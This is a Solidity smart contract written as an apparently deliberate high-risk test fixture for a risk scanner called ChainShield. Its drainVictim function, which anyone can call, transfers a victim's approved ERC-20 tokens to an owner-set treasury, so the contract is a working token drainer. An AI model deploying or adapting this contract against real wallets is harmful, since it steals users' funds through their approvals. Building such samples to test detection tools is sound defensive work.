// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title DangerousApprovalSpender
 * @dev Deliberately suspicious demo-risk contract for ChainShield simulation testing.
 * SIMULATES UNLIMITED APPROVAL ABUSE:
 * - Solicits token approval from victims (often unlimited uint256.max)
 * - Contains an unconstrained drain function callable by an attacker
 * - Intended Risk Score: HIGH TO CRITICAL (75-90)
 * 
 * DISCLAIMER: For educational testing on local EVM sandbox only.
 */
contract DangerousApprovalSpender is Ownable {
    address public treasury;

    event ApprovalExploited(address indexed token, address indexed victim, address indexed receiver, uint256 amount);
    event TreasuryUpdated(address newTreasury);

    constructor() Ownable(msg.sender) {
        treasury = msg.sender;
    }

    function setTreasury(address newTreasury) external onlyOwner {
        require(newTreasury != address(0), "Invalid treasury address");
        treasury = newTreasury;
        emit TreasuryUpdated(newTreasury);
    }

    /**
     * @dev Exploit function: Takes advantage of an existing ERC-20 approval grant
     * to transfer tokens from the victim to the treasury without their explicit session consent.
     */
    function drainVictim(address tokenAddress, address victim) external {
        IERC20 token = IERC20(tokenAddress);
        uint256 approvedAmount = token.allowance(victim, address(this));
        require(approvedAmount > 0, "No allowance granted to this contract");

        uint256 victimBalance = token.balanceOf(victim);
        uint256 amountToDrain = approvedAmount < victimBalance ? approvedAmount : victimBalance;
        require(amountToDrain > 0, "Victim balance is zero");

        bool success = token.transferFrom(victim, treasury, amountToDrain);
        require(success, "Exploit transferFrom failed");

        emit ApprovalExploited(tokenAddress, victim, treasury, amountToDrain);
    }
}
